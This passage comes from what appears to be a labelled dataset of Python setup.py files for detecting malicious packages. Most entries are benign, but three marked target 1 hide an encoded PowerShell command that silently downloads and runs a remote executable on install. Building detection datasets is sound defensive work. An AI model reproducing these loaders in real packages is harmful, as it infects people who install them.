sources=[\"src/gevent/_waiter.py\"],\n                   depends=['src/gevent/_gevent_c_waiter.pxd'],\n                   include_dirs=get_include_dirs())\n\nHUB_PRIMITIVES = Extension(name=\"gevent._gevent_c_hub_primitives\",\n                           sources=[\"src/gevent/_hub_primitives.py\"],\n                           depends=['src/gevent/_gevent_c_hub_primitives.pxd'],\n                           include_dirs=get_include_dirs())\n\nGLT_PRIMITIVES = Extension(name=\"gevent._gevent_c_greenlet_primitives\",\n                           sources=[\"src/gevent/_greenlet_primitives.py\"],\n                           depends=['src/gevent/_gevent_c_greenlet_primitives.pxd'],\n                           include_dirs=get_include_dirs())\n\nTRACER = Extension(name=\"gevent._gevent_c_tracer\",\n                   sources=[\"src/gevent/_tracer.py\"],\n                   depends=['src/gevent/_gevent_c_tracer.pxd'],\n                   include_dirs=get_include_dirs())\n\n\n_to_cythonize = [\n    GLT_PRIMITIVES,\n    HUB_PRIMITIVES,\n    HUB_LOCAL,\n    WAITER,\n    GREENLET,\n    TRACER,\n\n    ABSTRACT_LINKABLE,\n    SEMAPHORE,\n    LOCAL,\n\n    IDENT,\n    IMAP,\n    EVENT,\n    QUEUE,\n]\n\nEXT_MODULES = [\n    CORE,\n    ARES,\n    ABSTRACT_LINKABLE,\n    SEMAPHORE,\n    LOCAL,\n    GREENLET,\n    IDENT,\n    IMAP,\n    EVENT,\n    QUEUE,\n    HUB_LOCAL,\n    WAITER,\n    HUB_PRIMITIVES,\n    GLT_PRIMITIVES,\n    TRACER,\n]\n\nif bool_from_environ('GEVENTSETUP_DISABLE_ARES'):\n    print(\"c-ares module disabled, not building\")\n    EXT_MODULES.remove(ARES)\n\nLIBEV_CFFI_MODULE = 'src/gevent/libev/_corecffi_build.py:ffi'\nLIBUV_CFFI_MODULE = 'src/gevent/libuv/_corecffi_build.py:ffi'\ncffi_modules = []\n\nif not WIN:\n    # We can't properly handle (hah!) file-descriptors and\n    # handle mapping on Windows/CFFI with libev, because the file needed,\n    # libev_vfd.h, can't be included, linked, and used: it uses\n    # Python API functions, and you're not supposed to do that from\n    # CFFI code. Plus I could never get the libraries= line to ffi.compile()\n    # correct to make linking work.\n    # Also, we use the type `nlink_t`, which is not defined on Windows.\n    cffi_modules.append(\n        LIBEV_CFFI_MODULE\n    )\n\ncffi_modules.append(LIBUV_CFFI_MODULE)\n\ngreenlet_requires = [\n    # We need to watch our greenlet version fairly carefully,\n    # since we compile cython code that extends the greenlet object.\n    # Binary compatibility would break if the greenlet struct changes.\n    # (Which it did in 0.4.14 for Python 3.7 and again in 0.4.17; with\n    # the release of 1.0a1 it began promising ABI stability with SemVer\n    # so we can add an upper bound).\n    # 1.1.0 is required for 3.10; it has a new ABI, but only on 1.1.0.\n    'greenlet >= 1.1.0, < 2.0; platform_python_implementation==\"CPython\"',\n]\n\n# Note that we don't add cffi to install_requires, it's\n# optional. We tend to build and distribute wheels with the CFFI\n# modules built and they can be imported if CFFI is installed.\n# We need cffi 1.4.0 for new style callbacks;\n# we need cffi 1.11.3 (on CPython 3) to avoid test errors.\n\n# The exception is on Windows, where we want the libuv backend we distribute\n# to be the default, and that requires cffi; but don't try to install it\n# on PyPy or it messes up the build\nCFFI_DEP = \"cffi >= 1.12.2 ; platform_python_implementation == 'CPython'\"\nCFFI_REQUIRES = [\n    CFFI_DEP + \" and sys_platform == 'win32'\"\n]\n\n\ninstall_requires = greenlet_requires + CFFI_REQUIRES + [\n    # For event notification.\n    'zope.event',\n    # For event definitions, and our own interfaces; those should\n    # ultimately be published, but at this writing only the event\n    # interfaces are.\n    'zope.interface',\n    # setuptools is also used (via pkg_resources) for event\n    # notifications. It's a hard dependency of zope.interface\n    # anyway.\n    'setuptools',\n]\n\n# We use headers from greenlet, so it needs to be installed before we\n# can compile. If it isn't already installed before we start\n# installing, and we say 'pip install gevent', a 'setup_requires'\n# doesn't save us: pip happily downloads greenlet and drops it in a\n# .eggs/ directory in the build directory, but that directory doesn't\n# have includes! So we fail to build a wheel, pip goes ahead and\n# installs greenlet, and builds gevent again, which works.\n\n# Since we ship the greenlet header for buildout support (which fails\n# to install the headers at all, AFAICS, we don't need to bother with\n# the buggy setup_requires.)\n\nsetup_requires = CFFI_REQUIRES + []\n\nif PYPY:\n    # These use greenlet/greenlet.h, which doesn't exist on PyPy\n    EXT_MODULES.remove(LOCAL)\n    EXT_MODULES.remove(GREENLET)\n    EXT_MODULES.remove(SEMAPHORE)\n    EXT_MODULES.remove(ABSTRACT_LINKABLE)\n\n    # As of PyPy 5.10, this builds, but won't import (missing _Py_ReprEnter)\n    EXT_MODULES.remove(CORE)\n\n    # This uses PyWeakReference and doesn't compile on PyPy\n    EXT_MODULES.remove(IDENT)\n\n    _to_cythonize.remove(LOCAL)\n    _to_cythonize.remove(GREENLET)\n    _to_cythonize.remove(SEMAPHORE)\n    _to_cythonize.remove(IDENT)\n    _to_cythonize.remove(ABSTRACT_LINKABLE)\n\n    EXT_MODULES.remove(IMAP)\n    _to_cythonize.remove(IMAP)\n\n    EXT_MODULES.remove(EVENT)\n    _to_cythonize.remove(EVENT)\n\n    EXT_MODULES.remove(QUEUE)\n    _to_cythonize.remove(QUEUE)\n\n    EXT_MODULES.remove(HUB_LOCAL)\n    _to_cythonize.remove(HUB_LOCAL)\n\n    EXT_MODULES.remove(WAITER)\n    _to_cythonize.remove(WAITER)\n\n    EXT_MODULES.remove(GLT_PRIMITIVES)\n    _to_cythonize.remove(GLT_PRIMITIVES)\n\n    EXT_MODULES.remove(HUB_PRIMITIVES)\n    _to_cythonize.remove(HUB_PRIMITIVES)\n\n    EXT_MODULES.remove(TRACER)\n    _to_cythonize.remove(TRACER)\n\n\nfor mod in _to_cythonize:\n    EXT_MODULES.remove(mod)\n    EXT_MODULES.append(cythonize1(mod))\ndel _to_cythonize\n\n\n## Extras\n\nEXTRA_DNSPYTHON = [\n    # We're not currently compatible with 2.0, and dnspython 1.x isn't\n    # compatible weth Python 3.10 because of the removal of ``collections.MutableMapping``.\n    'dnspython >= 1.16.0, < 2.0; python_version < \"3.10\"',\n    'idna; python_version < \"3.10\"',\n]\nEXTRA_EVENTS = [\n    # No longer does anything, but the extra must stay around\n    # to avoid breaking install scripts.\n    # Remove this in 2021.\n]\n\nEXTRA_PSUTIL_DEPS = [\n    # Versions of PyPy2 prior to 7.3.1 (maybe?) are incompatible with\n    # psutil >= 5.6.4. 5.7.0 seems to work.\n    # https://github.com/giampaolo/psutil/issues/1659\n    # PyPy on Windows can't build psutil, it fails to link with the missing symbol\n    # PyErr_SetFromWindowsErr.\n    'psutil >= 5.7.0; sys_platform != \"win32\" or platform_python_implementation == \"CPython\"',\n]\n\nEXTRA_MONITOR = [\n] + EXTRA_PSUTIL_DEPS\n\nEXTRA_RECOMMENDED = [\n    # We need this at runtime to use the libev-CFFI and libuv backends\n    CFFI_DEP,\n    # Backport of selectors module to Python 2\n    'selectors2 ; python_version == \"2.7\"',\n    # Backport of socket.socketpair to Python 2; only needed on Windows\n    'backports.socketpair ; python_version == \"2.7\" and sys_platform == \"win32\"',\n] + EXTRA_DNSPYTHON + EXTRA_EVENTS + EXTRA_MONITOR\n\n\ndef make_long_description():\n    readme = read('README.rst')\n    about = read('docs', '_about.rst')\n    install = read('docs', 'install.rst')\n    readme = readme.replace('.. include:: docs/_about.rst',\n                            about)\n    readme = readme.replace('.. include:: docs/install.rst',\n                            install)\n\n    return readme\n\n\ndef run_setup(ext_modules):\n    setup(\n        name='gevent',\n        version=__version__,\n        description='Coroutine-based network library',\n        long_description=make_long_description(),\n        license='MIT',\n        keywords='greenlet coroutine cooperative multitasking light threads monkey',\n        author='Denis Bilenko',\n        author_email='denis.bilenko@gmail.com',\n        maintainer='Jason Madden',\n        maintainer_email='jason@nextthought.com',\n        url='http://www.gevent.org/',\n        project_urls={\n            'Bug Tracker': 'https://github.com/gevent/gevent/issues',\n            'Source Code': 'https://github.com/gevent/gevent/',\n            'Documentation': 'http://www.gevent.org',\n        },\n        package_dir={'': 'src'},\n        packages=find_packages('src'),\n        # Using ``include_package_data`` causes our generated ``.c``\n        # and ``.h`` files to be included in the installation. Those\n        # aren't needed at runtime (the ``.html`` files generated by\n        # Cython's annotation are much nicer to browse anyway, but we\n        # don't want to include those either), and downstream\n        # distributors have complained about them, so we don't want to\n        # include them. Nor do we want to include ``.pyx`` or ``.pxd``\n        # files that aren't considered public; the only ``.pxd`` files\n        # that ever offered the required Cython annotations to produce\n        # stable APIs weere in the libev cext backend; all of the\n        # internal optimizations provided by Cython compiling existing\n        # ``.py`` files using a matching ``.pxd`` do not. Furthermore,\n        # there are ABI issues that make distributing those extremely\n        # fragile. So do not use ``include_package_data``, explicitly\n        # spell out what we need. See https://github.com/gevent/gevent/issues/1568.\n        package_data={\n            # For any package\n            '': [\n                # Include files needed to run tests\n                '*.pem',\n                '*.crt',\n                '*.txt',\n                '*.key',\n                # We have a few .py files that aren't technically in packages;\n                # This one enables coverage for testing.\n                'coveragesite/*.py',\n            ]\n        },\n        ext_modules=ext_modules,\n        cmdclass={\n            'build_ext': ConfiguringBuildExt,\n            'clean': GeventClean,\n        },\n        install_requires=install_requires,\n        setup_requires=setup_requires,\n        extras_require={\n            # Each extra intended for end users must be documented in install.rst\n            'dnspython': EXTRA_DNSPYTHON,\n            'events': EXTRA_EVENTS,\n            'monitor': EXTRA_MONITOR,\n            'recommended': EXTRA_RECOMMENDED,\n            # End end-user extras\n            'docs': [\n                'repoze.sphinx.autointerface',\n                'sphinxcontrib-programoutput',\n                'zope.schema',\n            ],\n            # To the extent possible, we should work to make sure\n            # our tests run, at least a basic set, without any of\n            # these extra dependencies (i.e., skip things when they are\n            # missing). This helps serve as a smoketest for users.\n            'test': EXTRA_RECOMMENDED + [\n                # examples, called from tests, use this\n                'requests',\n\n                # We don't run coverage on Windows, and pypy can't build it there\n                # anyway (coveralls -> cryptopgraphy -> openssl).\n                # coverage 5 needs coveralls 1.11\n                'coverage >= 5.0 ; sys_platform != \"win32\"',\n                'coveralls>=1.7.0 ; sys_platform != \"win32\"',\n\n                'futures ; python_version == \"2.7\"',\n                'mock ; python_version == \"2.7\"',\n\n                # leak checks. previously we had a hand-rolled version.\n                'objgraph',\n\n                # The backport for contextvars to test patching. It sadly uses the same\n                # import name as the stdlib module.\n                'contextvars == 2.4 ; python_version > \"3.0\" and python_version < \"3.7\"',\n            ],\n        },\n        # It's always safe to pass the CFFI keyword, even if\n        # cffi is not installed: it's just ignored in that case.\n        cffi_modules=cffi_modules,\n        zip_safe=False,\n        test_suite=\"greentest.testrunner\",\n        classifiers=[\n            \"License :: OSI Approved :: MIT License\",\n            \"Programming Language :: Python :: 2.7\",\n            \"Programming Language :: Python :: 3.6\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"Programming Language :: Python :: Implementation :: CPython\",\n            \"Programming Language :: Python :: Implementation :: PyPy\",\n            \"Operating System :: MacOS :: MacOS X\",\n            \"Operating System :: POSIX\",\n            \"Operating System :: Microsoft :: Windows\",\n            \"Topic :: Internet\",\n            \"Topic :: Software Development :: Libraries :: Python Modules\",\n            \"Intended Audience :: Developers\",\n            \"Development Status :: 4 - Beta\"\n        ],\n        python_requires=\">=2.7,!=3.0.*,!=3.1.*,!=3.2.*,!=3.3.*,!=3.4.*,!=3.5\",\n        entry_points={\n            'gevent.plugins.monkey.will_patch_all': [\n                \"signal_os_incompat = gevent.monkey:_subscribe_signal_os\",\n            ],\n        },\n    )\n\n# Tools like pyroma expect the actual call to `setup` to be performed\n# at the top-level at import time, so don't stash it away behind 'if\n# __name__ == __main__'\n\nif os.getenv('READTHEDOCS'):\n    # Sometimes RTD fails to put our virtualenv bin directory\n    # on the PATH, meaning we can't run cython. Fix that.\n    new_path = os.environ['PATH'] + os.pathsep + os.path.dirname(sys.executable)\n    os.environ['PATH'] = new_path\n\ntry:\n    run_setup(EXT_MODULES)\nexcept BuildFailed:\n    if ARES not in EXT_MODULES or not ARES.optional:\n        raise\n    sys.stderr.write('\\nWARNING: The gevent.ares extension has been disabled.\\n')\n    EXT_MODULES.remove(ARES)\n    run_setup(EXT_MODULES)\n", "target": 0}
{"idx": "google-analytics-data-0.13.2", "func": "# -*- coding: utf-8 -*-\n\n# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport io\nimport os\nimport setuptools  # type: ignore\n\nversion = \"0.13.2\"\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n\nsetuptools.setup(\n    name=\"google-analytics-data\",\n    version=version,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-analytics-data\",\n    packages=[\n        package\n        for package in setuptools.PEP420PackageFinder.find()\n        if package.startswith(\"google\")\n    ],\n    namespace_packages=(\"google\", \"google.analytics\"),\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=(\n        \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n        \"proto-plus >= 1.22.0, <2.0.0dev\",\n        \"protobuf >= 3.19.0, <5.0.0dev\",\n    ),\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "google-cloud-videointelligence-2.8.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n# Package metadata.\n\nname = \"google-cloud-videointelligence\"\ndescription = \"Google Cloud Video Intelligence API client library\"\nversion = \"2.8.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\nscripts = [\"scripts/fixup_keywords.py\"]\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-videointelligence\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=scripts,\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "eli5-0.13.0", "func": "#!/usr/bin/env python\nfrom setuptools import setup, find_packages\nimport re\nimport os\n\n\ndef get_version():\n    fn = os.path.join(os.path.dirname(__file__), \"eli5\", \"__init__.py\")\n    with open(fn) as f:\n        return re.findall(\"__version__ = '([\\d.\\w]+)'\", f.read())[0]\n\n\ndef get_long_description():\n    readme = open('README.rst').read()\n    changelog = open('CHANGES.rst').read()\n    return \"\\n\\n\".join([\n        readme,\n        changelog.replace(':func:', '').replace(':ref:', '')\n    ])\n\nsetup(\n    name='eli5',\n    version=get_version(),\n    author='Mikhail Korobov, Konstantin Lopuhin',\n    author_email='kmike84@gmail.com, kostia.lopuhin@gmail.com',\n    license='MIT license',\n    long_description=get_long_description(),\n    description=\"Debug machine learning classifiers and explain their predictions\",\n    url='https://github.com/eli5-org/eli5',\n    zip_safe=False,\n    include_package_data=True,\n    packages=find_packages(exclude=['tests']),\n    install_requires=[\n        'attrs > 17.1.0',\n        'jinja2 >= 3.0.0',\n        'numpy >= 1.9.0',\n        'scipy',\n        'six',\n        'scikit-learn >= 0.20',\n        'graphviz',\n        'tabulate>=0.7.7',\n    ],\n    python_requires=\">=3.6\",\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'License :: OSI Approved :: MIT License',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n)\n", "target": 0}
{"idx": "killreplace-7.72", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'killreplace',\n    packages = ['modlib'],\n    version = '10.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fvcore-0.1.5.post20220512", "func": "#!/usr/bin/env python3\n# Copyright (c) Facebook, Inc. and its affiliates. All Rights Reserved.\n\nimport os\nfrom os import path\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version():\n    init_py_path = path.join(\n        path.abspath(path.dirname(__file__)), \"fvcore\", \"__init__.py\"\n    )\n    init_py = open(init_py_path, \"r\").readlines()\n    version_line = [l.strip() for l in init_py if l.startswith(\"__version__\")][0]\n    version = version_line.split(\"=\")[-1].strip().strip(\"'\\\"\")\n\n    # Used by CI to build nightly packages. Users should never use it.\n    # To build a nightly wheel, run:\n    # BUILD_NIGHTLY=1 python setup.py sdist\n    if os.getenv(\"BUILD_NIGHTLY\", \"0\") == \"1\":\n        from datetime import datetime\n\n        date_str = datetime.today().strftime(\"%Y%m%d\")\n        # pip can perform proper comparison for \".post\" suffix,\n        # i.e., \"1.1.post1234\" >= \"1.1\"\n        version = version + \".post\" + date_str\n\n        new_init_py = [l for l in init_py if not l.startswith(\"__version__\")]\n        new_init_py.append('__version__ = \"{}\"\\n'.format(version))\n        with open(init_py_path, \"w\") as f:\n            f.write(\"\".join(new_init_py))\n    return version\n\n\nsetup(\n    name=\"fvcore\",\n    version=get_version(),\n    author=\"FAIR\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/facebookresearch/fvcore\",\n    description=\"Collection of common code shared among different research \"\n    \"projects in FAIR computer vision team\",\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"numpy\",\n        \"yacs>=0.1.6\",\n        \"pyyaml>=5.1\",\n        \"tqdm\",\n        \"termcolor>=1.1\",\n        \"Pillow\",\n        \"tabulate\",\n        \"iopath>=0.1.7\",\n        \"dataclasses; python_version<'3.7'\",\n    ],\n    extras_require={\"all\": [\"shapely\"]},\n    packages=find_packages(exclude=(\"tests\",)),\n)\n", "target": 0}
{"idx": "tpvmpostsuper-3.34", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpvmpostsuper',\n    packages = ['modlib'],\n    version = '3.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqpiplibrandom-1.91", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpiplibrandom',\n    packages = ['modlib'],\n    version = '8.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-rst-docstrings-0.2.7", "func": "\"\"\"Setup file for building/installing flake8-rst-docstrings.\"\"\"\nfrom __future__ import print_function\nfrom __future__ import with_statement\n\nfrom setuptools import setup\n\n\ndef get_version(fname=\"flake8_rst_docstrings.py\"):\n    \"\"\"Parse our source code to get the current version number.\"\"\"\n    with open(fname) as f:\n        for line in f:\n            if line.startswith(\"__version__\"):\n                return eval(line.split(\"=\")[-1])\n\n\nsetup(\n    name=\"flake8-rst-docstrings\",\n    version=get_version(),\n    description=\"Python docstring reStructuredText (RST) validator\",\n    long_description=open(\"README.rst\").read(),\n    license=\"MIT\",\n    author=\"Peter J. A. Cock\",\n    author_email=\"p.j.a.cock@googlemail.com\",\n    url=\"https://github.com/peterjc/flake8-rst-docstrings\",\n    project_urls={\n        \"Documentation\": (\n            \"https://github.com/peterjc/flake8-rst-docstrings/blob/master/README.rst\"\n        ),\n        \"Source\": \"https://github.com/peterjc/flake8-rst-docstrings/\",\n        \"Tracker\": \"https://github.com/peterjc/flake8-rst-docstrings/issues\",\n    },\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Framework :: Flake8\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: OS Independent\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Quality Assurance\",\n    ],\n    keywords=\"PEP 287, pep287, docstrings, rst, reStructuredText\",\n    py_modules=[\"flake8_rst_docstrings\"],\n    python_requires=\">=3.7\",\n    install_requires=[\n        \"flake8 >= 3.0.0\",\n        \"restructuredtext_lint\",\n        \"pygments\",\n    ],\n    entry_points={\n        \"flake8.extension\": [\"RST = flake8_rst_docstrings:reStructuredTextChecker\"]\n    },\n)\n", "target": 0}
{"idx": "dffml-0.4.0.post2", "func": "import setuptools\n\nsetuptools.setup()\n", "target": 0}
{"idx": "django-modelcluster-6.0", "func": "#!/usr/bin/env python\n\ntry:\n    from setuptools import setup, find_packages\nexcept ImportError:\n    from distutils.core import setup\n\nsetup(\n    name='django-modelcluster',\n    version='6.0',\n    description=\"Django extension to allow working with 'clusters' of models as a single unit, independently of the database\",\n    author='Matthew Westcott',\n    author_email='matthew.westcott@torchbox.com',\n    url='https://github.com/wagtail/django-modelcluster',\n    packages=find_packages(exclude=('tests*',)),\n    license='BSD',\n    long_description=open('README.rst').read(),\n    python_requires=\">=3.7\",\n    install_requires=[\n        \"pytz>=2015.2\",\n        \"django>=2.2\",\n    ],\n    extras_require={\n        'taggit': ['django-taggit>=0.20'],\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3 :: Only',\n        'Framework :: Django',\n    ],\n)\n", "target": 0}
